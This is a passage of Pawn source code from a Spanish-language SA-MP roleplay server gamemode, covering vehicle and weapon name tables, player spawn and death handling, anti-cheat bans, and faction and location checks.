	{"Previon"}, {"Coach"}, {"Cabbie"}, {"Stallion"}, {"Rumpo"}, {"RC Bandit"}, {"Romero"}, {"Packer"}, {"Monster"}, 
	{"Admiral"}, {"Squalo"}, {"Seasparrow"}, {"Pizzaboy"}, {"Tram"}, {"Article Trailer 2"}, {"Turismo"}, {"Speeder"}, 
	{"Reefer"}, {"Tropic"}, {"Flatbed"}, {"Yankee"}, {"Caddy"}, {"Solair"}, {"Berkley's RC Van"}, {"Skimmer"}, 
	{"PCJ-600"}, {"Faggio"}, {"Freeway"}, {"RC Baron"}, {"RC Raider"}, {"Glendale"}, {"Oceanic"}, {"Sanchez"}, 
	{"Sparrow"}, {"Patriot"}, {"Quad"}, {"Coastguard"}, {"Dinghy"}, {"Hermes"}, {"Sabre"}, {"Rustler"}, {"ZR-350"}, 
	{"Walton"}, {"Regina"}, {"Comet"}, {"BMX"}, {"Burrito"}, {"Camper"}, {"Marquis"}, {"Baggage"}, {"Dozer"}, 
	{"Maverick"}, {"News Chopper"}, {"Rancher"}, {"FBI Rancher"}, {"Virgo"}, {"Greenwood"}, {"Jetmax"}, {"Hotring"}, 
	{"Sandking"}, {"Blista Compact"}, {"Police Maverick"}, {"Boxville"}, {"Benson"}, {"Mesa"}, {"RC Goblin"}, 
	{"Hotring Racer A"}, {"Hotring Racer B"}, {"Bloodring Banger"}, {"Rancher"}, {"Super GT"}, {"Elegant"}, 
	{"Journey"}, {"Bike"}, {"Mountain Bike"}, {"Beagle"}, {"Cropdust"}, {"Stunt"}, {"Tanker"}, {"Roadtrain"}, 
	{"Nebula"}, {"Majestic"}, {"Buccaneer"}, {"Shamal"}, {"Hydra"}, {"FCR-900"}, {"NRG-500"}, {"HPV1000"}, 
	{"Cement Truck"}, {"Tow Truck"}, {"Fortune"}, {"Cadrona"}, {"FBI Truck"}, {"Willard"}, {"Forklift"}, 
	{"Tractor"}, {"Combine"}, {"Feltzer"}, {"Remington"}, {"Slamvan"}, {"Blade"}, {"Freight"}, {"Streak"}, 
	{"Vortex"}, {"Vincent"}, {"Bullet"}, {"Clover"}, {"Sadler"}, {"Firetruck LA"}, {"Hustler"}, {"Intruder"}, 
	{"Primo"}, {"Cargobob"}, {"Tampa"}, {"Sunrise"}, {"Merit"}, {"Utility"}, {"Nevada"}, {"Yosemite"}, {"Windsor"}, 
	{"Monster A"}, {"Monster B"}, {"Uranus"}, {"Jester"}, {"Sultan"}, {"Stratum"}, {"Elegy"}, {"Raindance"}, 
	{"RC Tiger"}, {"Flash"}, {"Tahoma"}, {"Savanna"}, {"Bandito"}, {"Freight Flat"}, {"Streak Carriage"}, 
	{"Kart"}, {"Mower"}, {"Dunerider"}, {"Sweeper"}, {"Broadway"}, {"Tornado"}, {"AT-400"}, {"DFT-30"}, {"Huntley"}, 
	{"Stafford"}, {"BF-400"}, {"Newsvan"}, {"Tug"}, {"Article Trailer 3"}, {"Emperor"}, {"Wayfarer"}, {"Euros"}, {"Mobile Hotdog"}, 
	{"Club"}, {"Freight Carriage"}, {"Trailer 3"}, {"Andromada"}, {"Dodo"}, {"RC Cam"}, {"Launch"}, {"Police Car LSPD"}, 
	{"Police Car SFPD"}, {"Police Car LVPD"}, {"Police Ranger"}, {"Picador"}, {"S.W.A.T Van"}, {"Alpha"}, 
	{"Phoenix"}, {"Glendale"}, {"Sadler"}, {"Luggage Trailer A"}, {"Luggage Trailer B"}, {"Stair Trailer"}, 
	{"Boxville"}, {"Farm Plow"}, {"Utility Trailer"}
};

new HoldingBones[][] = {
	"Nada", 
	"Columna", 
	"Cabeza", 
	"Brazo Izq Sup", 
	"Brazo Der Sup", 
	"Mano Izq", 
	"Mano Derecha", 
	"Muslo Izq", 
	"Muslo Der", 
	"Pie Izq", 
	"Pie Der", 
	"Right calf", 
	"Left calf", 
	"AnteBrazo Izq", 
	"AnteBrazo Der", 
	"Clavicula Izq", 
	"Clavicula Der", 
	"Cuello", 
	"Quijada"};
//new Climas;
new skinb = mS_INVALID_LISTID;
new armariolist = mS_INVALID_LISTID;

new PayDayLeft = MaxTimePayDay;
new nod = 0;
new Misile_Launcher;
new tvp, tvp1, lucianogate, fissore;
new pdgate1, pdgate2; //Puertas de LSPD
new lspd2, lspd1, lspd3, lspdg5; // LSPD
new fbidoor1, fbidoor2, fbidoor3, fbig1, fbig2, fbibarra; // FBI
new fbipuerta; //nuevas puertas
new prison1, prison2, prison3;//Prision Militar
new meca1, meca2, meca3; // mecanicos nuevas rejas
// Gafas
new Text:SunGlasses;
new Text:streamer;
// respawn con cuenta atras
new ValorConteo = 45, TimerConteo, Conteo = 0;
// textdraw conteo respawn
new Text:respawntime;

new Text:TVCAM_Background, Text:TVCAM_CornerTopLeft, Text:TVCAM_CornerTopRight, Text:TVCAM_CornerBottomLeft, Text:TVCAM_CornerBottomRight, Text:TextdrawUp, Text:TextdrawDown, Text:TextdrawLeft, Text:TextdrawRight, Text:TextdrawFinish;
		
new Interview = 0;
new Interviewer[32] = "Nadie";
new Tax = 0;
new TaxValue = 0;
new Jackpot = 0;
new Blood = 1000;

new noac = 0;
new noooc = 1;
new DobleOn = 0;
new TripleOn = 0;
new adds = 0;
new ghour = 0;
new gminute = 0;
new gsecond = 0; 
new realtime = 1;
new wtime = 16;
new shifthour;
new mmtimer;
new levelexp = 4;
new cchargetime = 20;
new BankTimer;

new const GunNames[][] = {
    "Puños", 
    "Un Puño Americano", 
    "Un Palo de Golf", 
    "Una Porra Policial", 
    "Una Navaja", 
    "Un Bate de Baseball", 
    "Una Pala", 
    "Un Palo de Pool", 
    "Una Katana", 
    "Una Motosierra", 
    "Un Consolador violeta", 
    "Un Consolador corto blanco", 
    "Un Consolador largo blanco", 
    "Un Consolador", 
    "Un Ramo de Flores", 
    "Un Bastón", 
    "Una Granada Explosiva", 
    "Una Granada de Humo", 
    "Un Cóctel Molotov", 
    "Misil de Hunter o Hydra", 
    "Fuego de Hydra", 
    "Un Propulsor", 
    "Una Pistola Colt .45", 
    "Una Pistola Colt .45 con Silenciador", 
    "Una Pistola Desert Eagle", 
    "Una Escopeta", 
    "Una Escopeta Recortada", 
    "Una Escopeta de Combate", 
    "Un Micro subfusil uzi", 
    "Un Subfusil MP5", 
    "Un Rifle automático AK-47", 
    "Un Rifle automático M4", 
    "Un Micro Subfusil tec9", 
    "Un Rifle de Caza", 
    "Un Rifle de Francotirador", 
    "Un Lanzacohetes", 
    "Un Lanzamisiles busca calor", 
    "Un Lanzallamas", 
    "Una Minigun", 
    "Una Carga explosiva", 
    "Un Detonador de carga explosiva", 
    "Un Aerosol de Gas Pimienta", 
    "Un Extintor de Fuego", 
    "Una Cámara Fotográfica", 
    "Unas Gafas de visión nocturna", 
    "Unas Gafas de visión infrarroja", 
    "un paracaidas", 
    "nada", 
    "Pistola falsa", 
    "Choque de auto", 
    "Helices de helicoptero", 
    "Explocion"};

new Motocicletas[10][0] = {
{448}, {461}, {462}, {463}, {468}, 
{521}, {522}, {523}, {581}, {586}
};

new vehiculoEncendido[MAX_VEHICLES];
new InfoWoofer[MAX_PLAYERS][WoInfo];

new CochesPolicia[30];
new CochesMedicos[9];
new CochesMecanicos[11];
new CochesNoticias[4];
new CochesFbi[8];
new CochesPesca[4];
new CochesGobierno[4]; 
new CochesRenta[37];
new CochesFortCarson[5];

main(){}
/*
 *	Devolucines de llamadas Streamer y SA-MP
 *	Inicio
 *
 *	29/07/2015 - 02:21 a.m.
 *	Hora Venezolana.
 *
*/
public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat)
{
	if(!passenger_seat && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && GetVehicleDistanceFromPoint(vehicleid, gVps[vehicleid][0], gVps[vehicleid][1], gVps[vehicleid][2]) > 50.0)
	{
	    new Float:x, Float:y, Float:z;
		GetXYZInFrontOfPlayer(playerid, x, y, z, 5.0);
		if(GetVehicleDistanceFromPoint(vehicleid, x, y, z) < 5.0)
		{
			enteroChar[gCSpawn]{playerid}++;
			if(enteroChar[gCSpawn]{playerid} > 3)
			{
				new string[126];
				format(string, sizeof(string), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] fue baneado por spawnAuto.", Nombre(playerid), playerid);
				MensajeAdmin(-1, string, 1);
				
				new tmp15[24], tmp16[32];
				format(tmp16, sizeof(tmp16), "0xA%.1fB%.1fC%.1fV%d", x, y, z, vehicleid);
				format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
				ban(playerid, "Spawn-Autos", tmp15, tmp16);
			}
			return 0;
 		}
	}
	GetVehiclePos(vehicleid, gVps[vehicleid][0], gVps[vehicleid][1], gVps[vehicleid][2]);
	return 1;
}
public OnPlayerSpawn(playerid)
{
	if(!booleano[gIngreso]{playerid})
	{
		Mensaje(playerid, COLOR_ROJO, "Advertencia: {ffffff}Es necesario que inicie sesión, usted fue expulsado(Kick).");
		Kick(playerid);
		return 1;
	}
	//
	new string[128];
	//anti weapon
	for(new i=0; i<13; i++) detectarArmas[playerid][i][2] = 0;
	//
	if(IsPlayerConnected(playerid))
	{
	    SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
		switch(cuenta[playerid][cTutorial])
		{
			case 0:
			{
				SetPlayerCameraPos(playerid, 1426.023315, -1698.833740, 44.268581);
				SetPlayerCameraLookAt(playerid, 1428.870727, -1702.144775, 41.833606);
				SetPlayerPos(playerid, 1426.023315, -1698.833740, 0.0000);	
				
				for(new p=0;p<5;p++) TextDrawShowForPlayer(playerid, Presentacion[p]);
				
				PlayerTextDrawSetString(playerid, InfoText[playerid][4], "~r~ZonaZero ~b~~h~~h~~h~es una comunidad de SAMP RolePlay en la que encontraras muchas opciones para divertirte.~n~~b~~h~~h~~h~Llevamos desde Junio de 2012 sirviendo a nuestros usuarios para brindarles una gran experiencia de rol.~n~~b~~h~~h~~h~Lo que diferencia a ~r~ZonaZero ~b~~h~~h~~h~de los demás servidores, es que el usuario tiene su propia libertad.~n~~b~~h~~h~~h~Podras entrar en facciones, legales o ilegales, o entrar a familias o incluso hacer tu propia familia!~n~~b~~h~~h~~h~Toda la información la podras encontrar en nuestro foro ~r~www.CenterIsland.com~n~");
				PlayerTextDrawShow(playerid, InfoText[playerid][4]);
				PlayerTextDrawShow(playerid, InfoText[playerid][14]);
				SelectTextDraw(playerid, COLOR_LIMA);
				
				booleano[gOoc]{playerid} = true;
				booleano[gNews]{playerid} = true;
				booleano[gFam]{playerid} = true;
				
				ClearChatbox(playerid, 21);
				CambioPagina[playerid] = 1;
				CambiarPagina(playerid);
				StopAudioStreamForPlayer(playerid);
				return 1;
			}
			case 1:
			{
				switch(booleano[gMurio]{playerid})
				{
					case false:
					{
						SetPosEx(playerid, cuenta[playerid][cPosiciones][0], cuenta[playerid][cPosiciones][1], cuenta[playerid][cPosiciones][2] + 1, 0, cuenta[playerid][cInterior], cuenta[playerid][cMundo]);
						
						SetHP(playerid, (!cuenta[playerid][cVida])?(50.0):(cuenta[playerid][cVida]));
						darArmadura(playerid, cuenta[playerid][cArmadura]);
						
						SetPlayerWeapons(playerid);
						UpdatePlayerStat(playerid);
						SetPlayerStats(playerid);
						//Devolver dinero si salio trabajando.
						if(cuenta[playerid][pagas])
						{
							ganaDinero(playerid, cuenta[playerid][pagas]);
							format(string, sizeof(string), "Usted ha recaudado ~g~%d$~w~ como ~g~%s~w~.", cuenta[playerid][pagas], trabajos[cuenta[playerid][cTrabajo]][trabNombre]);
							TextoInformatico(25, playerid, string);
							cuenta[playerid][pagas] = 0;
						}
						//
						if(cuenta[playerid][cPack] > 0 && gettime() > cuenta[playerid][cPack])
						{
							Mensaje(playerid, COLOR_ROJO, "Su paquete Gold/Premium ha caducado.");
							cuenta[playerid][cPack] = 0;
							cuenta[playerid][cPackID] = 0;
						}
						else if(cuenta[playerid][cDonador] && gettime() > cuenta[playerid][cDonar][0])
						{
							cuenta[playerid][cDonador] = 0;
							cuenta[playerid][cDonar][0] = 0;
							cuenta[playerid][cDonar][2] = 0;
							Mensaje(playerid, COLOR_ROJO, "Sus beneficios PREMIUM han caducado.");
						}
						//
						for(new i=0; i<sizeof(IFacciones);i++) GangZoneShowForPlayer(playerid, IFacciones[i][If@gang], ColorAlpha[IFacciones[i][If@color]]);
						StopAudioStreamForPlayer(playerid);
						SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 0);
						//
						PreloadAnimLib(playerid, "BAR");
						PreloadAnimLib(playerid, "BOMBER");
						PreloadAnimLib(playerid, "BSKTBALL");
						PreloadAnimLib(playerid, "CAR");
						PreloadAnimLib(playerid, "CARRY");
						PreloadAnimLib(playerid, "COP_AMBIENT");
						PreloadAnimLib(playerid, "CRACK");
						PreloadAnimLib(playerid, "DAM_JUMP");
						PreloadAnimLib(playerid, "DANCING");
						PreloadAnimLib(playerid, "DEALER");
						PreloadAnimLib(playerid, "FIGHT_C");
						PreloadAnimLib(playerid, "FIGHT_D");
						PreloadAnimLib(playerid, "FOOD");
						PreloadAnimLib(playerid, "GANGS");
						PreloadAnimLib(playerid, "GHANDS");
						PreloadAnimLib(playerid, "GRAVEYARD");
						PreloadAnimLib(playerid, "GYMNASIUM");
						PreloadAnimLib(playerid, "INT_HOUSE");
						PreloadAnimLib(playerid, "KISSING");
						PreloadAnimLib(playerid, "MD_CHASE");
						PreloadAnimLib(playerid, "MEDIC");
						PreloadAnimLib(playerid, "PARK");
						PreloadAnimLib(playerid, "PAULNMAC");
						PreloadAnimLib(playerid, "PED");
						PreloadAnimLib(playerid, "POLICE");
						PreloadAnimLib(playerid, "RIOT");
						PreloadAnimLib(playerid, "SHOP");
						PreloadAnimLib(playerid, "SKATE");
						PreloadAnimLib(playerid, "SMOKING");
						PreloadAnimLib(playerid, "STRIP");
						PreloadAnimLib(playerid, "SUNBATHE");
						PreloadAnimLib(playerid, "SWEET");
						PreloadAnimLib(playerid, "SWORD");
						PreloadAnimLib(playerid, "WEAPONS");
						PreloadAnimLib(playerid, "WUZI");
						//Prueba de rol
						if(cuenta[playerid][cInv1][0] < 11 && cuenta[playerid][cTutorial]) HacerPruebaRol(playerid);	
						//Resetear Slots VIPs
						if(!cuenta[playerid][cDonador])
						{
							if(!cuenta[playerid][cDonar][2])
							{
								if(cuenta[playerid][cCoche3] || cuenta[playerid][cCoche4] || cuenta[playerid][cNegocio2] != 9999 || cuenta[playerid][cCasa2] != 9999)
								{
									cuenta[playerid][cDonar][2] = gettime() + 432000;
									Mensaje(playerid, COLOR_AMARILLO, "Debe renovar su paquete VIP antes que se le reseteen sus slots VIP, antes de 5 dias.");
								}
							}
							else if(cuenta[playerid][cDonar][2] != -1 && gettime() > cuenta[playerid][cDonar][2])
							{
								cuenta[playerid][cDonar][2] = -1;
								new auto3 = cuenta[playerid][cCoche3], auto4 = cuenta[playerid][cCoche4];
								
								if(cuenta[playerid][cCasa2] != 9999)
								{
									VenderPropiedad(INVALID_PLAYER_ID, cuenta[playerid][cCasa2]);
									cuenta[playerid][cCasa2] = 9999;
									Mensaje(playerid, COLOR_ROJO, "Su casa fue vendida por no renovar VIP.");
								}
								if(cuenta[playerid][cNegocio2] != 9999)
								{
									VenderLocal(cuenta[playerid][cNegocio2]);
									cuenta[playerid][cNegocio2] = 9999;
									Mensaje(playerid, COLOR_ROJO, "Su negocio fue vendido por no renovar VIP.");
								}
								if(auto3)
								{
									VenderAuto(auto3);
									cuenta[playerid][cCoche3] = 0;
									Mensaje(playerid, COLOR_ROJO, "Su auto fue vendido por no renovar VIP.");
								}			
								if(auto4)
								{
									VenderAuto(auto4);
									cuenta[playerid][cCoche4] = 0;
									Mensaje(playerid, COLOR_ROJO, "Su auto fue vendido por no renovar VIP.");
								}
							}
						}
					}
					case true:
					{
						if(!cuenta[playerid][cCarcel])
						{
							booleano[gMurio]{playerid} = false;
							Mensaje(playerid, COLOR_CIAN, "Te has recuperado exsitósamente de tu accidente.");
							Mensaje(playerid, COLOR_CIAN, "Te hemos transladado al hospital.");
							Mensaje(playerid, COLOR_CIAN, "Desafortunadamente tienes amnesia, no recuerdas nada.");
							SetPosEx(playerid, -2671.2676, 509.5787, 48.0791, 272.0, 0, 0);
							SetPlayerStats(playerid);
							
							if(!cuenta[playerid][cSeguro])
							{ 
								pierdeDinero(playerid, 100);
								Mensaje(playerid, COLOR_VERDE, "* No tienes seguro, te cobramos 100$. Compre uno en el Hospital.");
							}
						}
					}
				}
			}
		}
		switch(cuenta[playerid][cCarcel])
		{
			case 1:
			{
				Mensaje(playerid, COLOR_ROJO3, "Usted esta en Jail Administrativa.");
				format(string, sizeof(string), "Administrador: %s", cuenta[playerid][cCarcelAdmin]);
				Mensaje(playerid, COLOR_ROJO3, string);
				format(string, sizeof(string), "Tiempo: %d minutos", cuenta[playerid][cTiempoCarcel] / 60);
				Mensaje(playerid, COLOR_ROJO3, string);
				format(string, sizeof(string), "Razon: %s", cuenta[playerid][cCarcelRazon]);
				Mensaje(playerid, COLOR_ROJO3, string);
				SetPosEx(playerid, 325.2867, 305.1505, 999.1484, 348.7300, 5, (playerid + 20));
			}
			case 2:
			{
				SetPlayerInterior(playerid, 0);
				cuenta[playerid][cInterior] = 0;
				SetPlayerPos(playerid, 268.5777, 1857.9351, 9.8133);
			}
			case 3:
			{
				SetPosEx(playerid, 2018.3386, -2048.9937, 17.8739, 0.0, 0, 0);
				Mensaje(playerid, COLOR_ROJO3, "Has tenido un accidente en prisión.");
				Mensaje(playerid, COLOR_ROJO3, "Te hemos transladado a una celda solitaria donde estaras seguro.");
			}
			case 4:
			{
				SetPosEx(playerid, 2018.3386, -2048.9937, 17.8739, 0.0, 0, 0);
				Mensaje(playerid, COLOR_ROJO3, "Has tenido un accidente en prisión.");
				Mensaje(playerid, COLOR_ROJO3, "Te hemos transladado a una celda solitaria donde estaras seguro.");
			}
			case 5:
			{
				SetPosEx(playerid, 2018.3386, -2048.9937, 17.8739, 0.0, 0, 0);
				Mensaje(playerid, COLOR_ROJO3, "Has tenido un accidente en prisión.");
				Mensaje(playerid, COLOR_ROJO3, "Te hemos transladado a una celda solitaria donde estaras seguro.");
			}
		}
	}
	//
	switch(cuenta[playerid][cAdministrador])
	{
		case 0 .. 6, 2012 .. 2014:
		{
			//
			SetPlayerColor(playerid, (!cuenta[playerid][cDonador])?(0xFFFFFF00):(0xFFD70000));
			///Impuestos resetear casas, autos, negocios[Inicio].
			if(cuenta[playerid][cCoche])
			{
				if(VerificarCaducamiento(cuenta[playerid][cCoche], Nombre(playerid)))
				{
					cuenta[playerid][cCoche] = 0;
				}
			}
			if(cuenta[playerid][cCoche2])
			{
				if(VerificarCaducamiento(cuenta[playerid][cCoche2], Nombre(playerid)))
				{
					cuenta[playerid][cCoche2] = 0;
				}
			}
			if(cuenta[playerid][cCoche3])
			{
				if(VerificarCaducamiento(cuenta[playerid][cCoche3], Nombre(playerid)))
				{
					cuenta[playerid][cCoche3] = 0;
				}
			}
			if(cuenta[playerid][cCoche4])
			{
				if(VerificarCaducamiento(cuenta[playerid][cCoche4], Nombre(playerid)))
				{
					cuenta[playerid][cCoche4] = 0;
				}
			}
			//
			if(cuenta[playerid][cNegocio] != 9999)
			{
				if(strfind(negocio[cuenta[playerid][cNegocio]][bOwner], Nombre(playerid), false) == -1)
				{
					cuenta[playerid][cNegocio] = 9999;
					Mensaje(playerid, COLOR_ROJO, "Su negocio fue vendido por no pagar impuestos.");
				}
			}
			if(cuenta[playerid][cNegocio2] != 9999)
			{
				if(strfind(negocio[cuenta[playerid][cNegocio2]][bOwner], Nombre(playerid), false) == -1)
				{
					cuenta[playerid][cNegocio2] = 9999;
					Mensaje(playerid, COLOR_ROJO, "Su negocio fue vendido por no pagar impuestos.");
				}
			}
			//
			if(cuenta[playerid][cCasa] != 9999)
			{
				if(strfind(casa[cuenta[playerid][cCasa]][hOwner], PlayerName(playerid), false) == -1)
				{
					cuenta[playerid][cCasa] = 9999;
					Mensaje(playerid, COLOR_ROJO, "Su casa fue vendida por no pagar impuestos.");
				}
			}
			if(cuenta[playerid][cCasa2] != 9999)
			{
				if(strfind(casa[cuenta[playerid][cCasa2]][hOwner], PlayerName(playerid), false) == -1)
				{
					cuenta[playerid][cCasa2] = 9999;
					Mensaje(playerid, COLOR_ROJO, "Su casa fue vendida por no pagar impuestos.");
				}
			}
			///Impuestos resetear casas, autos, negocios[Fin].
		}
		default:
		{			
			format(string, sizeof(string), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] fue baneado por Admin-Hack.", Nombre(playerid), playerid);
			MensajeAdmin(-1, string, 1);
			
			format(string, sizeof(string), "B%dK-%d", cuenta[playerid][cAdministrador] * 12, cuenta[playerid][cAdministrador]);
			
			new tmp[24];
			format(tmp, sizeof(tmp), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
			ban(playerid, "Admin-Hack", tmp, string);
			return 1;
		}
	}
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	new string[128], i = entero[playerid][eActId]; 
	
	terminarPrueba(playerid);
	ocultarCajero(playerid);
	if(enteroChar[gAnden]{playerid} != 255) habilidadArmas[enteroChar[gAnden]{playerid}][hA@uso] = false;
	
	if(booleano[npcUse]{playerid})
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
		{
			if(nonplayers[i][npcUtil] > gettime())
			{
				format(string, sizeof(string), "%s dice: Hasta luego!", nonplayers[i][npcNombre]);
				Mensaje(playerid, COLOR_BLANCO, string);

				nonplayers[i][npcUtil] = false;
				booleano[npcUse]{playerid} = false;
				TogglePlayerControllable(playerid, true);
				CancelSelectTextDraw(playerid);
				for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[i][interfaz][ind]);
			}
		}
	}

	if(killerid != INVALID_PLAYER_ID)
	{
		format(string, sizeof(string), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] asesino a %s[%d] con %s.", Nombre(killerid), killerid, Nombre(playerid), playerid, GunNames[reason]);
		MensajeAdmin(-1, string, 1);
		//
		cuenta[killerid][cAsesinatos]++;
	}
	
	cuenta[playerid][cVida] = 100;
	cuenta[playerid][cArmadura] = 0;
	cuenta[playerid][cMuerte]++;
	//
	booleano[gMurio]{playerid} = true;
	//
	InAmbu[playerid] = 0;
	UsingDrugs[playerid] = 0;
	UsingEctasy[playerid] = 0;
	EctasyEffect[playerid] = 0;
	UsingRitalin[playerid] = 0;
	RitalinEffect[playerid] = 0;
	UsingHeroina[playerid] = 0;
	HeroinaEffect[playerid] = 0;
	HeroinaBeat[playerid] = 0;
	UsingMarihuana[playerid] = 0;
	MarihuanaEffect[playerid] = 0;
	MarihuanaBeat[playerid] = 0;
	Left4Life[playerid] = 0;
	//
 	StopAudioStreamForPlayer(playerid);
	SetPlayerColor(playerid, 0xBFC0C200);
	
    if(SmokeTimer[playerid]) KillTimer(SmokeTimer[playerid]);
	if(DrugTimer[playerid]) KillTimer(DrugTimer[playerid]);
	if(Mobile[playerid] != 255)
	{
		if(Mobile[playerid] < 255)
		{
			Mensaje(Mobile[playerid], COLOR_GRIS2, "La llamada se perdió.");
			CellTime[Mobile[playerid]] = 0;
			CellTime[playerid] = 0;
			Mobile[Mobile[playerid]] = 255;
		}
		Mobile[playerid] = 255;
		CellTime[playerid] = 0;
	}
	return 1;
}
/*
 *	Devolucines de llamadas Streamer y SA-MP
 *	Final
 *
 *	29/07/2015 - 02:21 a.m.
 *	Hora Venezolana.
 *
*/

Team_LSPD(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	1)		{	return 1;	}
		else if(leader	==	1)	{	return 1;	}
	}
	return 0;
}

Team_Fort(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	5)		{	return 1;	}
		else if(leader	==	5)	{	return 1;	}
	}
	return 0;
}

Team_FBI(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	9) { return 1; }
		else if(leader	==	9) { return 1; }
	}
	return 0;
}

Team_Mecanicos(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	4)		{	return 1;	}
		else if(leader	==	4)	{	return 1;	}
	}
	return 0;
}

Team_SAMUR(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	3)		{	return 1;	}
		else if(leader	==	3)	{	return 1;	}
	}
	return 0;
}

EsPeriodista(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	7)		{	return 1;	}
		else if(leader == 7)	{	return 1;	}
	}
	return 0;
}

Gobierno(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member	==	6)		{	return 1;	}
		else if(leader == 6)	{	return 1;	}
	}
	return 0;
}

Presidente(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = cuenta[playerid][cLider];
		if(leader == 6)	{	return 1;	}
	}
	return 0;
}

IsACop(playerid){
	if(IsPlayerConnected(playerid)){
	    new leader = cuenta[playerid][cLider];
	    new member = cuenta[playerid][cMiembro];
	    if(member == 1){	return 1;	}
		else if(leader == 1){	return 1;	}
	}
	return 0;
}

EsComprable(vehicleid)
{
	if(vehicleid < VEHICULOS_COMPRABLES)return true;
	return false;
}

IsAtGasStation(playerid){
    if(IsPlayerConnected(playerid)){
  		if(IsPlayerInRangeOfPoint(playerid, 8.0, 1004.0070, -939.3102, 42.1797) || IsPlayerInRangeOfPoint(playerid, 8.0, 1944.3260, -1772.9254, 13.3906))			return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, -90.5515, -1169.4578, 2.4079) || IsPlayerInRangeOfPoint(playerid, 8.0, -1609.7958, -2718.2048, 48.5391))    return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 2114.5444, 920.1169, 10.8203) || IsPlayerInRangeOfPoint(playerid, 8.0, 2640.6272, 1106.5349, 10.8203))      return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1625.0463, -2167.6428, 13.4402) || IsPlayerInRangeOfPoint(playerid, 8.0, -1676.6323, 414.0262, 6.9484))     return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 2202.2349, 2474.3494, 10.5258) || IsPlayerInRangeOfPoint(playerid, 8.0, 614.9333, 1689.7418, 6.6968))       return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, -1328.8250, 2677.2173, 49.7665) || IsPlayerInRangeOfPoint(playerid, 8.0, 70.3882, 1218.6783, 18.5165))      return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 2113.7390, 920.1079, 10.5255) || IsPlayerInRangeOfPoint(playerid, 8.0, -1327.7218, 2678.8723, 50.0625))     return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1637.0149, 2331.5129, 10.8722) || IsPlayerInRangeOfPoint(playerid, 8.0, 1636.6686, 2325.8711, 10.8722))     return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1636.6140, 2320.6423, 10.8722) || IsPlayerInRangeOfPoint(playerid, 8.0, 1595.5337, 2198.9404, 10.8203))     return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 656.4265, -559.8610, 16.5015) || IsPlayerInRangeOfPoint(playerid, 8.0, 656.3797, -570.4138, 16.5015))       return 1;
 		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1099.2325, -350.4425, 73.9922))    return 1;
	}
	return 0;
}

IsAtTaller(playerid)
{
    if(IsPlayerConnected(playerid)){
  		if(IsPlayerInRangeOfPoint(playerid, 50.0, 2143.3237, -2258.2664, 13.2962)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 20.0, 2151.2905, -2250.7261, 13.2957)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 20.0, 2161.5913, -2241.7776, 13.2888)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 20.0, 2156.8833, -2263.9092, 13.3017)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, 587.1603, -2002.3984, 3.8381)) return 1;
    }
	return 0;
}

IsAtHotdog(playerid)
{
    if(IsPlayerConnected(playerid)){
        if(IsPlayerInRangeOfPoint(playerid, 5.0, 1357.8468, -1749.8292, 13.3789)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1589.6941, -1288.7108, 17.5133)) return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1100.6458, -1383.2819, 13.7813)) return 1;
		else if (IsPlayerInRangeOfPoint(playerid, 5.0, 1301.0686, -1248.4834, 13.5469)) return 1;
		}
	return 0;
}

IsAtMap(playerid)
{
    if(IsPlayerConnected(playerid)){
        if(IsPlayerInRangeOfPoint(playerid, 5.0, 1181.39, -1317.95, 13.62))         return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 772.53, -1327.30, 13.35))   return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1813.88, -1901.38, 13.36))   return 1;
		else if (IsPlayerInRangeOfPoint(playerid, 5.0, 1639.07, -2187.55, 13.37))  return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1839.23, -1422.26, 13.38))   return 1;
